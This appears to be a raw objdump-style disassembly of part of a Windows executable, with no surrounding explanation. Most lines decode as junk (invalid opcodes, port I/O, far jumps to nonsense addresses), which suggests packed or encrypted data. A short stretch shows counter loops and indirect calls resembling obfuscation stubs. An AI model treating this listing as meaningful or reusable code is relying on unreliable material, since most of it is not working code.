  40a64f:	div    esp
  40a651:	mov    bh,0xe1
  40a653:	call   0x86bce7ee
  40a658:	jne    0x40a665
  40a65a:	shl    DWORD PTR ds:0x7b922385,cl
  40a660:	xchg   esi,eax
  40a661:	lock mov WORD PTR [ecx+esi*4-0x65],fs
  40a666:	dec    esp
  40a667:	jo     0x40a638
  40a669:	fcomp  QWORD PTR [edx+0x37]
  40a66c:	xchg   edi,eax
  40a66d:	mov    eax,ds:0xb520d876
  40a672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a673:	in     al,0xcd
  40a675:	mov    esp,0xb0be1400
  40a67a:	test   DWORD PTR [eax],esp
  40a67c:	nop
  40a67d:	adc    DWORD PTR [esi+0x17ae2057],esi
  40a683:	aad    0xb7
  40a685:	fs popf 
  40a687:	jo     0x40a6cb
  40a689:	jo     0x40a696
  40a68b:	pop    ecx
  40a68c:	stos   BYTE PTR es:[edi],al
  40a68d:	rcr    DWORD PTR [ebp+0x7d79691a],1
  40a693:	(bad)  
  40a694:	in     eax,dx
  40a695:	inc    ebp
  40a696:	push   es
  40a697:	iret   
  40a698:	mov    dh,0xc5
  40a69a:	adc    ah,0x8a
  40a69d:	sub    al,0xa8
  40a69f:	xchg   ebx,eax
  40a6a0:	mov    ds:0x4c76756a,al
  40a6a5:	iret   
  40a6a6:	sahf   
  40a6a7:	xchg   edi,eax
  40a6a8:	adc    eax,edi
  40a6aa:	push   es
  40a6ab:	scas   al,BYTE PTR es:[edi]
  40a6ac:	or     DWORD PTR [esp+esi*1],esp
  40a6af:	cmp    al,0x1a
  40a6b1:	ss jmp 0x5f83958d
  40a6b7:	inc    edi
  40a6b8:	fwait
  40a6b9:	cdq    
  40a6ba:	fld    QWORD PTR [ecx-0x74b870c3]
  40a6c0:	loopne 0x40a653
  40a6c2:	ins    DWORD PTR es:[edi],dx
  40a6c3:	sub    eax,0x89b51a79
  40a6c8:	sub    BYTE PTR [esi+0x208b766f],al
  40a6ce:	cmp    DWORD PTR [esi],esp
  40a6d0:	push   edx
  40a6d1:	sub    cl,BYTE PTR [edx]
  40a6d3:	push   0xffffff98
  40a6d5:	ds pop ecx
  40a6d7:	adc    al,0xcf
  40a6d9:	mov    WORD PTR [edi+0x4f],ds
  40a6dc:	or     al,0xa9
  40a6de:	jl     0x40a6e2
  40a6e0:	je     0x40a74f
  40a6e2:	xchg   ebp,eax
  40a6e3:	inc    esp
  40a6e4:	lea    eax,[ecx+0x4a]
  40a6e7:	ficom  WORD PTR [eax+0x360ac774]
  40a6ed:	in     eax,0xb2
  40a6ef:	aad    0x57
  40a6f1:	sbb    eax,DWORD PTR [eax-0x71]
  40a6f4:	mov    WORD PTR [ecx],ds
  40a6f6:	mov    al,ds:0x9d383bdc
  40a6fb:	mov    al,0xa9
  40a6fd:	in     eax,dx
  40a6fe:	and    al,0xef
  40a700:	mov    esi,0xec040242
  40a705:	int3   
  40a706:	add    esp,DWORD PTR [esi+0xfe02799]
  40a70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a70d:	test   ebx,0xbfde2293
  40a713:	mov    dh,0x85
  40a715:	(bad)  
  40a716:	hlt    
  40a717:	jb     0x40a6d8
  40a719:	adc    esp,ecx
  40a71b:	es (bad) 
  40a71d:	fisubr WORD PTR [edi-0x62]
  40a720:	mov    bh,0xbe
  40a722:	sahf   
  40a723:	add    eax,0xc61fd76
  40a728:	mov    eax,ds:0xc40f8c6b
  40a72d:	add    al,BYTE PTR [ecx]
  40a72f:	aaa    
  40a730:	mov    eax,0x3740a826
  40a735:	add    bh,BYTE PTR [ebp-0x3a7741d0]
  40a73b:	pop    ebp
  40a73c:	ror    ebx,0xce
  40a73f:	mov    al,0xd
  40a741:	cli    
  40a742:	mov    dh,0x35
  40a744:	rcl    DWORD PTR ds:0x696f74b1,0x91
  40a74b:	mov    bh,0x77
  40a74d:	(bad)  
  40a74e:	pop    ss
  40a74f:	imul   ebx,DWORD PTR [ebp-0x26cb8b46],0x18
  40a756:	fisubr WORD PTR [ebp-0x1d8234cd]
  40a75c:	mov    ebx,cs
  40a75e:	mov    bh,0xb1
  40a760:	add    bl,BYTE PTR [edx-0x188257b5]
  40a766:	repnz mov edi,0xe3de0abd
  40a76c:	lahf   
  40a76d:	adc    ch,BYTE PTR [eax]
  40a76f:	adc    DWORD PTR [eax+0x40],eax
  40a772:	js     0x40a757
  40a774:	inc    esp
  40a775:	adc    eax,0x5e1ef4a9
  40a77a:	add    esi,ebx
  40a77c:	add    eax,0xc4fbceda
  40a781:	add    BYTE PTR [esi+0x1363d83c],ch
  40a787:	add    DWORD PTR [ebp-0x579edae6],ebx
  40a78d:	mov    WORD PTR [edi-0x1f],es
  40a790:	fnsave [ebx]
  40a792:	stos   BYTE PTR es:[edi],al
  40a793:	inc    ebx
  40a794:	popf   
  40a795:	out    0x83,al
  40a797:	inc    ecx
  40a798:	push   ebx
  40a799:	(bad)
  40a79d:	xor    eax,esi
  40a79f:	mov    edx,ss
  40a7a1:	add    al,0xe6
  40a7a3:	mov    esp,0xcf4eca71
  40a7a8:	sub    cl,BYTE PTR [eax-0x665d1048]
  40a7ae:	push   0x4f
  40a7b0:	scas   al,BYTE PTR es:[edi]
  40a7b1:	mov    edx,0x7fcadb00
  40a7b6:	inc    eax
  40a7b7:	adc    BYTE PTR [eax-0x1f],bh
  40a7ba:	adc    bh,BYTE PTR [ecx+0x38]
  40a7bd:	inc    edi
  40a7be:	out    0xc,eax
  40a7c0:	or     edx,DWORD PTR [ebp+0x60c47942]
  40a7c6:	or     edx,ecx
  40a7c8:	fisub  DWORD PTR [ebx]
  40a7ca:	mov    ebp,0xe14eb75d
  40a7cf:	xchg   edi,eax
  40a7d0:	pusha  
  40a7d1:	and    bh,BYTE PTR [edi+0x41]
  40a7d4:	int    0x6d
  40a7d6:	data16 js 0x40a789
  40a7d9:	dec    edx
  40a7da:	pop    es
  40a7db:	or     cl,BYTE PTR ds:0x4220cf24
  40a7e1:	inc    ecx
  40a7e2:	inc    eax
  40a7e3:	cmp    DWORD PTR [edi+0x53],ebp
  40a7e6:	scas   eax,DWORD PTR es:[edi]
  40a7e7:	or     edi,edx
  40a7e9:	sbb    al,0x37
  40a7eb:	adc    eax,0x7f767415
  40a7f0:	cwde   
  40a7f1:	jae    0x40a7b7
  40a7f3:	sub    al,0xab
  40a7f5:	inc    ecx
  40a7f6:	sbb    al,BYTE PTR [ecx+0x3c]
  40a7f9:	pop    edi
  40a7fa:	cmp    al,0x59
  40a7fc:	push   es
  40a7fd:	stos   BYTE PTR es:[edi],al
  40a7fe:	or     eax,0x241b01e0
  40a803:	cmc    
  40a804:	mov    ds:0x699acd19,eax
  40a809:	cmp    eax,0x8e71ecca
  40a80e:	mov    eax,ds:0xca4bc761
  40a813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a814:	dec    edi
  40a815:	dec    eax
  40a816:	jle    0x40a892
  40a818:	dec    ebx
  40a819:	add    eax,0x4cf26451
  40a81e:	retf   0x73ba
  40a821:	int    0x55
  40a823:	mov    bh,0xb
  40a825:	add    BYTE PTR [ebx],bh
  40a827:	sbb    BYTE PTR [ecx-0x6368548],al
  40a82d:	adc    DWORD PTR [edx],0x9ca720c7
  40a833:	ret    
  40a834:	push   edx
  40a835:	cmp    eax,esi
  40a837:	test   al,0xb2
  40a839:	adc    al,0x7f
  40a83b:	inc    edi
  40a83c:	je     0x40a8b8
  40a83e:	xor    ah,BYTE PTR [edi]
  40a840:	or     DWORD PTR [edi+0x21],edi
  40a843:	sub    al,0x96
  40a845:	sub    BYTE PTR [edi-0xcfec3d4],ch
  40a84b:	in     eax,0xb3
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43045d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x11396379],bl
  40a93e:	cwd    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8c9
  40a948:	mov    eax,0x58253bc1
  40a94d:	bound  edx,QWORD PTR [esi-0x73b6c1a0]
  40a953:	jb     0x40a9c0
  40a955:	or     eax,DWORD PTR [ebx+eax*2+0x22]
  40a959:	push   ss
  40a95a:	dec    esp
  40a95b:	sbb    BYTE PTR [edi-0x57],0xe5
  40a95f:	repnz out 0xf7,eax
  40a962:	cmc    
  40a963:	stc    
  40a964:	sub    eax,edx
  40a966:	adc    ecx,DWORD PTR [ebx-0x3f]
  40a969:	jle    0x40a8ed
  40a96b:	out    dx,eax
  40a96c:	fisubr WORD PTR ds:0x4bb0f3f2
  40a972:	outs   dx,BYTE PTR ds:[esi]
  40a973:	nop
  40a974:	pop    esi
  40a975:	sahf   
  40a976:	test   eax,0x43bf74de
  40a97b:	je     0x40a93f
  40a97d:	adc    al,0xe4
  40a97f:	out    0xe4,al
  40a981:	push   esp
  40a982:	xor    BYTE PTR [esp+esi*2],ah
  40a985:	loope  0x40a9bd
  40a987:	fwait
  40a988:	arpl   WORD PTR [edi],bp
  40a98a:	jno    0x40a9ca
  40a98c:	cmp    DWORD PTR [eax+0x6a],ecx
  40a98f:	in     al,0xee
  40a991:	int3   
  40a992:	in     eax,dx
  40a993:	call   0xedc4bcd3
  40a998:	push   eax
  40a999:	cmp    ebp,DWORD PTR [edx+0xa6829fe]
  40a99f:	pop    esi
  40a9a0:	test   eax,0xfbb41cb8
  40a9a5:	inc    ebx
  40a9a6:	mul    DWORD PTR ds:0xbec8fdb2
  40a9ac:	pop    ebp
  40a9ad:	push   edx
  40a9ae:	mov    al,0x2f
  40a9b0:	test   al,0xcc
  40a9b2:	adc    edx,DWORD PTR [edi+ecx*1]
  40a9b5:	outs   dx,DWORD PTR ds:[esi]
  40a9b6:	loopne 0x40a99e
  40a9b8:	add    DWORD PTR [edx+0x50efc6d6],esi
  40a9be:	sub    al,0x32
  40a9c0:	mov    eax,ds:0x626fac92
  40a9c5:	sar    BYTE PTR [edi-0x44ab9e64],cl
  40a9cb:	push   edi
  40a9cc:	into   
  40a9cd:	or     eax,0x28f7a510
  40a9d2:	jg     0x40a973
  40a9d4:	mov    edx,0xaa06b2f1
  40a9d9:	inc    esp
  40a9da:	mov    dl,0x64
  40a9dc:	aaa    
  40a9dd:	add    DWORD PTR [edi],edx
  40a9df:	bound  edx,QWORD PTR [esi+esi*2-0x59525968]
  40a9e6:	cld    
  40a9e7:	jnp    0x40a994
  40a9e9:	sbb    DWORD PTR [edi+eax*4+0x1b],edx
  40a9ed:	sbb    eax,0x2a996734
  40a9f2:	pop    ss
  40a9f3:	push   edx
  40a9f4:	call   FWORD PTR [eax+ecx*8]
  40a9f7:	pushf  
  40a9f8:	cmp    eax,0xfd2ad2b
  40a9fd:	outs   dx,BYTE PTR ds:[esi]
  40a9fe:	arpl   WORD PTR [edi-0x274aaf5b],cx
  40aa04:	cmp    DWORD PTR [edi],esp
  40aa06:	add    eax,0xf2730ef4
  40aa0b:	and    al,0x95
  40aa0d:	cmp    BYTE PTR [ebx],al
  40aa0f:	add    DWORD PTR [edi],0x28
  40aa12:	adc    ecx,DWORD PTR [eax]
  40aa14:	scas   al,BYTE PTR es:[edi]
  40aa15:	lahf   
  40aa16:	mov    cl,0x5d
  40aa18:	rol    DWORD PTR [edi+0x2],0x48
  40aa1c:	sub    ch,ch
  40aa1e:	push   esp
  40aa1f:	lds    ebp,FWORD PTR [ecx]
  40aa21:	loope  0x40aa83
  40aa23:	push   cs
  40aa24:	cs stos BYTE PTR es:[edi],al
  40aa26:	nop
  40aa27:	jns    0x40a9d5
  40aa29:	cmp    BYTE PTR [esi],cl
  40aa2b:	test   DWORD PTR [ebx-0x1a],ecx
  40aa2e:	arpl   WORD PTR [ecx-0x55f6523d],di
  40aa34:	lock mov ebp,0x8f59b673
  40aa3a:	ret    0xde5d
  40aa3d:	cmp    dl,BYTE PTR [ecx-0x6bb66753]
  40aa43:	sbb    BYTE PTR [eax-0x53],ah
  40aa46:	fbstp  TBYTE PTR [eax]
  40aa48:	fmul   QWORD PTR [ecx*2-0x7c8010f2]
  40aa4f:	inc    ebp
  40aa50:	cmp    ch,bl
  40aa52:	xchg   ecx,eax
  40aa53:	or     BYTE PTR [ecx+eiz*1-0xd],al
  40aa57:	in     eax,dx
  40aa58:	in     eax,0xf2
  40aa5a:	xlat   BYTE PTR ds:[ebx]
  40aa5b:	sbb    esi,DWORD PTR [edx+0x1b]
  40aa5e:	imul   BYTE PTR [eax+0x5e5f3575]
  40aa64:	test   eax,0x7ce9c58f
  40aa69:	push   cs
  40aa6a:	pop    eax
  40aa6b:	cmp    eax,0xacdaaf6e
  40aa70:	xor    ah,ah
  40aa72:	adc    ch,BYTE PTR [ecx-0x33d4612f]
  40aa78:	push   ebp
  40aa79:	mov    esp,0x35ee01cf
  40aa7e:	jno    0x40aa25
  40aa80:	mov    ds:0x44313c4c,eax
  40aa85:	sets   BYTE PTR [ebx]
  40aa88:	mov    al,0x66
  40aa8a:	adc    al,0xcc
  40aa8c:	out    0x8,al
  40aa8e:	sbb    BYTE PTR [edx-0x7b68e7c1],0xd1
  40aa95:	hlt    
  40aa96:	and    BYTE PTR [edx-0x2f],al
  40aa99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa9a:	sub    eax,0xafabcc02
  40aa9f:	push   esp
  40aaa0:	outs   dx,DWORD PTR ds:[si]
  40aaa2:	sbb    BYTE PTR [eax+0x6fffc2f6],al
  40aaa8:	pop    ebx
  40aaa9:	push   edx
  40aaab:	arpl   WORD PTR [esi+0x68d0e8be],cx
  40aab1:	add    edx,DWORD PTR [esi+0x5653d530]
  40aab7:	test   DWORD PTR [esi+0x5d23d496],esi
  40aabd:	sbb    eax,0xb61f7aed
  40aac2:	mov    bl,0x7a
  40aac4:	push   0x990a3f77
  40aac9:	(bad)
  40aacd:	xchg   BYTE PTR [ecx+0x5e0b3cbd],ah
  40aad3:	mov    cl,0x4a
  40aad5:	cmp    ah,ch
  40aad7:	scas   eax,DWORD PTR es:[edi]
  40aad8:	jmp    0xbf868fbe
  40aadd:	push   esi
  40aade:	in     eax,0x54
  40aae0:	mov    al,0xc7
  40aae2:	mov    eax,ds:0x865039cb
  40aae7:	xor    eax,0x9ad9c8ea
  40aaec:	cmp    cl,bh
  40aaee:	out    0xed,al
  40aaf0:	and    al,0x4a
  40aaf2:	and    ch,dl
  40aaf4:	in     al,dx
  40aaf5:	xchg   esp,eax
  40aaf6:	push   es
  40aaf7:	sub    BYTE PTR [ecx-0x7bcaefd4],dh
  40aafd:	or     DWORD PTR [ecx+edi*2+0x20f48b6b],edx
  40ab04:	push   ebp
  40ab05:	aad    0xdf
  40ab07:	fstp   TBYTE PTR [ebx+0x69]
  40ab0a:	daa    
  40ab0b:	adc    al,BYTE PTR [eax+0x63801686]
  40ab11:	inc    ecx
  40ab12:	xchg   BYTE PTR [eax-0xe4ef55],cl
  40ab18:	outs   dx,DWORD PTR ds:[esi]
  40ab19:	shr    DWORD PTR [edx-0x2b],cl
  40ab1c:	push   0x933e6d92
  40ab21:	push   0x30a00c75
  40ab26:	cmp    eax,0xdd46f063
  40ab2b:	fidiv  WORD PTR ds:0x336bbc34
  40ab31:	push   es
  40ab32:	(bad)  
  40ab33:	xor    cl,al
  40ab35:	xor    DWORD PTR [ebp+0x32d00f9f],0xffffffdd
  40ab3c:	pop    esp
  40ab3d:	dec    ebp
  40ab3e:	inc    eax
  40ab3f:	xor    bl,BYTE PTR [ecx-0x10]
  40ab42:	and    BYTE PTR [ecx],ch
  40ab44:	push   ds
  40ab45:	aam    0x17
  40ab47:	xor    eax,0x2e5fa253
  40ab4c:	pop    edx
  40ab4d:	das    
  40ab4e:	adc    eax,0x2705475
  40ab53:	shl    DWORD PTR [edi-0x277e0858],cl
  40ab59:	retf   0x7a80
  40ab5c:	mov    dh,0xaf
  40ab5e:	cmp    BYTE PTR [edi+0xc0f3b67],bh
  40ab64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab65:	mov    ?,WORD PTR [esi-0x2d]
  40ab68:	loope  0x40aba5
  40ab6a:	sub    BYTE PTR [ecx+0x5c7708f5],al
  40ab70:	rcr    ebp,0xa1
  40ab73:	mov    esi,0x4a11383e
  40ab78:	jp     0x40aafd
  40ab7a:	call   0xf944:0x68ce0953
  40ab81:	jmp    0x40ab18
  40ab83:	fsubr  QWORD PTR [ebx+ebx*8+0x31]
  40ab87:	mov    bl,0x76
  40ab89:	icebp  
  40ab8a:	sbb    eax,DWORD PTR [edx+0x1b57114a]
  40ab90:	or     BYTE PTR [edi-0x3a94b063],bh
  40ab96:	mov    WORD PTR [ecx+0xe],cs
  40ab99:	clc    
  40ab9a:	adc    DWORD PTR [ecx+0x73],esp
  40ab9d:	mov    al,0x65
  40ab9f:	push   esp
  40aba0:	das    
  40aba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba2:	push   esi
  40aba3:	retf   0x277c
  40aba6:	test   al,0xee
  40aba8:	les    edx,FWORD PTR [edi+ebp*4+0x25d9b3e3]
  40abaf:	aaa    
  40abb0:	mov    eax,ds:0xc89d1c70
  40abb5:	dec    esp
  40abb6:	jne    0x40ab92
  40abb8:	mov    ?,WORD PTR [edi]
  40abba:	sbb    edx,DWORD PTR [ebx]
  40abbc:	fsub   DWORD PTR [edi+0x5d]
  40abbf:	clc    
  40abc0:	jge    0x40ab53
  40abc2:	mov    dh,0x4c
  40abc4:	push   ebp
  40abc5:	mov    DWORD PTR [ebx+0x3b778d81],ecx
  40abcb:	inc    edi
  40abcc:	push   esi
  40abcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abce:	icebp  
  40abcf:	xchg   ecx,eax
  40abd0:	leave  
  40abd1:	pop    ebx
  40abd2:	popa   
  40abd3:	fnstsw WORD PTR [ecx+0x7b]
  40abd6:	pop    ds
  40abd7:	jnp    0x40aba7
  40abd9:	mov    ebx,edi
  40abdb:	jl     0x40abc7
  40abdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abde:	jmp    0x8006f807
  40abe3:	push   esi
  40abe4:	out    dx,al
  40abe5:	imul   eax,DWORD PTR [esi+0x7f],0x68ab5c95
  40abec:	mov    ebx,0xac696425
  40abf1:	jecxz  0x40ab7a
  40abf3:	xlat   BYTE PTR ds:[ebx]
  40abf4:	mov    esp,0x1eb64306
  40abf9:	(bad)  [eax+0x14]
  40abfc:	out    0x2f,eax
  40abfe:	jle    0x40ac02
  40ac00:	xlat   BYTE PTR ds:[ebx]
  40ac01:	jl     0x40abec
  40ac03:	inc    ebp
  40ac04:	in     al,0x61
  40ac06:	push   eax
  40ac07:	data16 or al,0x4b
  40ac0a:	push   edi
  40ac0b:	adc    DWORD PTR [esi],ecx
  40ac0d:	mov    bl,0x81
  40ac0f:	mov    ebx,0x5c3ded8b
  40ac14:	inc    esp
  40ac15:	in     eax,0xc8
  40ac17:	mov    eax,ds:0x28bd4537
  40ac1c:	xor    bl,al
  40ac1e:	jmp    0x6d5f:0x6b1f677
  40ac25:	ror    BYTE PTR [ecx+ebx*1],0x5b
  40ac29:	cmp    bh,ch
  40ac2b:	loopne 0x40abf9
  40ac2d:	jle    0x40abc0
  40ac2f:	aas    
  40ac30:	lahf   
  40ac31:	ret    
  40ac32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac33:	or     al,0xf6
  40ac35:	sar    DWORD PTR [esi-0x426bec58],0xe8
  40ac3c:	mov    esi,0x3d2b2d3b
  40ac41:	adc    DWORD PTR [eax-0xe119904],ecx
  40ac47:	adc    al,0x21
  40ac49:	pusha  
  40ac4a:	xchg   edx,eax
  40ac4b:	outs   dx,DWORD PTR ds:[esi]
  40ac4c:	sbb    DWORD PTR [ebp-0x41],esp
  40ac4f:	and    BYTE PTR [ecx],0x46
  40ac52:	(bad)  
  40ac53:	or     BYTE PTR [ecx-0x5787ef5],dh
  40ac59:	or     ebp,esi
  40ac5b:	push   ebx
  40ac5c:	iret   
  40ac5d:	nop
  40ac5e:	jge    0x40abf6
  40ac60:	cmp    esp,eax
  40ac62:	xchg   ebp,eax
  40ac63:	lea    esi,[ebp+0x481be20]
  40ac69:	es das 
  40ac6b:	or     ebx,ebp
  40ac6d:	stc    
  40ac6e:	lods   al,BYTE PTR ds:[esi]
  40ac6f:	aam    0xc9
  40ac71:	hlt    
  40ac72:	lea    esp,[edi+edi*8]
  40ac75:	and    ebp,DWORD PTR [ecx+eiz*4+0x41227c]
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	mov    ecx,0x49da7a45
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac48
  40ac9f:	ss das 
  40aca1:	jb     0x40ac86
  40aca3:	xchg   ebp,eax
  40aca4:	je     0x40ac8c
  40aca6:	dec    ebp
  40aca7:	neg    BYTE PTR [ebp+esi*2+0x16]
  40acab:	inc    ebp
  40acac:	mov    BYTE PTR [edx+0x38beb916],cl
  40acb2:	fiadd  WORD PTR [ebp-0x3f]
  40acb5:	cmc    
  40acb6:	imul   ebx,DWORD PTR [ecx],0x13202683
  40acbc:	ins    BYTE PTR es:[edi],dx
  40acbd:	mov    ds:0x41753d4a,al
  40acc2:	scas   al,BYTE PTR es:[edi]
  40acc3:	inc    eax
  40acc4:	retf   0x2a19
  40acc7:	add    eax,0x4130340a
  40accc:	push   ds
  40accd:	cmp    BYTE PTR [edi-0x362a5ce8],cl
  40acd3:	hlt    
  40acd4:	adc    al,0xf4
  40acd6:	cdq    
  40acd7:	lahf   
  40acd8:	and    eax,0xa20c143
  40acdd:	xor    al,0xb7
  40acdf:	sahf   
  40ace0:	inc    edi
  40ace1:	imul   eax,DWORD PTR [edx+0x49015179],0x56
  40ace8:	push   edx
  40ace9:	inc    edi
  40acea:	arpl   WORD PTR [ebx],di
  40acec:	in     eax,0x97
  40acee:	iret   
  40acef:	loop   0x40ac9e
  40acf1:	retf   0x99fe
  40acf4:	cmp    eax,0x889e8a15
  40acf9:	ficom  WORD PTR [esi]
  40acfb:	push   cs
  40acfc:	clc    
  40acfd:	pop    ebp
  40acfe:	jmp    0xdbf1:0x57610a9e
  40ad05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad06:	ret    
  40ad07:	dec    ebx
  40ad08:	jge    0x40ad88
  40ad0a:	clc    
  40ad0b:	mov    bh,0x51
  40ad0d:	mov    esi,fs
  40ad0f:	dec    ebx
  40ad10:	loope  0x40ad76
  40ad12:	fcomp  DWORD PTR ds:0x81d549f5
  40ad18:	cmp    dh,al
  40ad1a:	(bad)  
  40ad1b:	push   ebp
  40ad1c:	and    edi,edx
  40ad1e:	fmul   DWORD PTR [ebp-0x64]
  40ad21:	aad    0xb6
  40ad23:	or     eax,DWORD PTR [eax-0x15]
  40ad26:	test   al,0x15
  40ad28:	sbb    dh,BYTE PTR [ebx+0x7b]
  40ad2b:	xchg   edi,eax
  40ad2c:	int3   
  40ad2d:	pop    ds
  40ad2e:	push   ebx
  40ad2f:	and    al,0xb2
  40ad31:	gs jns 0x40ad03
  40ad34:	scas   al,BYTE PTR es:[edi]
  40ad35:	inc    esp
  40ad36:	lds    esi,FWORD PTR [esi-0x57b8030f]
  40ad3c:	aaa    
  40ad3d:	sbb    al,0x8
  40ad3f:	xchg   BYTE PTR [ebp-0x7b],al
  40ad42:	mov    ebx,0x4fa9ba58
  40ad47:	std    
  40ad48:	mov    ebp,0xea51e309
  40ad4d:	nop
  40ad4e:	xor    al,0xc3
  40ad50:	jae    0x40ad84
  40ad52:	or     al,bh
  40ad54:	pop    esi
  40ad55:	js     0x40ad57
  40ad57:	imul   edi,DWORD PTR ds:[edx+edx*8-0x17daaf28],0x1db32190
  40ad63:	cld    
  40ad64:	jmp    0xcb77:0xa66c9db7
  40ad6b:	out    dx,eax
  40ad6c:	fnstsw WORD PTR [esi-0x13aafad9]
  40ad72:	dec    ecx
  40ad73:	sub    DWORD PTR [ebp+0x5c79f104],0xeb6e32dc
  40ad7d:	(bad)  
  40ad7e:	cmp    edi,DWORD PTR [esi-0x79]
  40ad81:	sub    BYTE PTR [esi],0x67
  40ad84:	test   eax,0xf58684e2
  40ad89:	sub    al,0xb6
  40ad8b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40ad8d:	push   eax
  40ad8e:	cmp    BYTE PTR [edx+eax*2+0x3d],cl
  40ad92:	mov    al,ds:0xf965a17f
  40ad97:	mov    edx,0x3641bdb8
  40ad9c:	imul   ecx,esi,0xb10091c
  40ada2:	xchg   ebx,eax
  40ada3:	pop    es
  40ada4:	or     al,0xa5
  40ada6:	shl    DWORD PTR [ebx-0x3d],1
  40ada9:	cli    
  40adaa:	fild   DWORD PTR [ecx+ebp*4-0x48380a70]
  40adb1:	adc    DWORD PTR ds:0x4757d990,esp
  40adb7:	lods   al,BYTE PTR ds:[esi]
  40adb8:	xchg   edx,eax
  40adb9:	dec    ebp
  40adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adbb:	rcr    BYTE PTR [edx],1
  40adbd:	jne    0x40ade7
  40adbf:	jg     0x40ae27
  40adc1:	hlt    
  40adc2:	inc    esi
  40adc3:	neg    BYTE PTR cs:[esp+edi*4-0x18]
  40adc8:	rcl    DWORD PTR [eax],0xd4
  40adcb:	lock fiadd DWORD PTR [edx]
  40adce:	gs dec edx
  40add0:	mov    ds:0x2e6c4c17,eax
  40add5:	dec    esi
  40add6:	jp     0x40ade0
  40add8:	ret    
  40add9:	xchg   edi,eax
  40adda:	shl    BYTE PTR [ecx-0x2e0e74c7],cl
  40ade0:	sub    eax,0xc77e6bc8
  40ade5:	nop
  40ade6:	sbb    eax,0x4daa0330
  40adeb:	pop    ss
  40adec:	fst    DWORD PTR [edi+0x0]
  40adef:	out    dx,al
  40adf0:	ret    
  40adf1:	xchg   BYTE PTR [ebp+0x7b],bh
  40adf4:	test   BYTE PTR [ebx-0x3f277bbb],al
  40adfa:	test   DWORD PTR [esi-0x2fa0ac6b],edx
  40ae00:	pop    ds
  40ae01:	outs   dx,DWORD PTR ds:[esi]
  40ae02:	jbe    0x40addd
  40ae04:	lods   al,BYTE PTR ds:[esi]
  40ae05:	or     eax,0xa354f8c8
  40ae0a:	mov    ecx,0xbd0ba299
  40ae0f:	jnp    0x40ade4
  40ae11:	gs jno 0x40adaa
  40ae14:	jae    0x40ada5
  40ae16:	inc    eax
  40ae17:	adc    eax,0xaa58c983
  40ae1c:	test   DWORD PTR [edi-0x7d],esp
  40ae1f:	jge    0x40add3
  40ae21:	adc    BYTE PTR [esi-0x34],0xc4
  40ae25:	jae    0x40ae33
  40ae27:	in     eax,dx
  40ae28:	jmp    0x84ae:0xec21eb96
  40ae2f:	mov    bh,0x64
  40ae31:	or     DWORD PTR [edi-0x57],esi
  40ae34:	mov    DWORD PTR [esi-0x34a178e9],edx
  40ae3a:	icebp  
  40ae3b:	jne    0x40aea0
  40ae3d:	gs push 0x8c6765f8
  40ae43:	sbb    dh,BYTE PTR [ebx-0x74efec1d]
  40ae49:	dec    edx
  40ae4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae4b:	out    dx,al
  40ae4c:	bound  edi,QWORD PTR [edi-0x44]
  40ae4f:	push   0xdff77b8a
  40ae54:	jae    0x40ade8
  40ae56:	xchg   ebp,eax
  40ae57:	fstp   QWORD PTR [eax-0xbf19b48]
